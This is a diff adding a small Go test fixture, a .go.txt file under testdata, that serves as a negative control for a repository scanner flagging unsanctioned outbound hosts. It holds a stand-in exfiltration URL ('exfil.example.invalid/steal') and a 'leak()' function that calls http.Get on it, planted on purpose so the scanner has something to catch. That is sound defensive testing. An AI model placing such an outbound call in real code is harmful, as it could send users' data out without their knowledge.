@@ -1,0 +1,22 @@
+// This file is a negative-control fixture for
+// internal/audit/outbound_hosts_test.go — it deliberately contains both
+// offense kinds the scanner must catch. It is kept under testdata (the Go
+// tool never compiles anything there, and the main repo-wide walk skips
+// testdata directories too) and named with a .go.txt suffix so no editor
+// or linter treats it as buildable Go source. It is parsed directly by the
+// negative-control test via go/parser to prove the scanner is
+// non-vacuous — it reports offenses that actually exist, not merely that
+// today's tree happens to be clean.
+package fixture
+
+import "net/http"
+
+// Offense 1: a foreign absolute URL literal — the host is neither the
+// sanctioned egress point's configured host nor loopback/localhost.
+const exfilURL = "http://exfil.example.invalid/steal"
+
+// Offense 2: outbound HTTP construction outside the single sanctioned
+// egress point (plugins/paperless/client.go).
+func leak() {
+	_, _ = http.Get(exfilURL)
+}
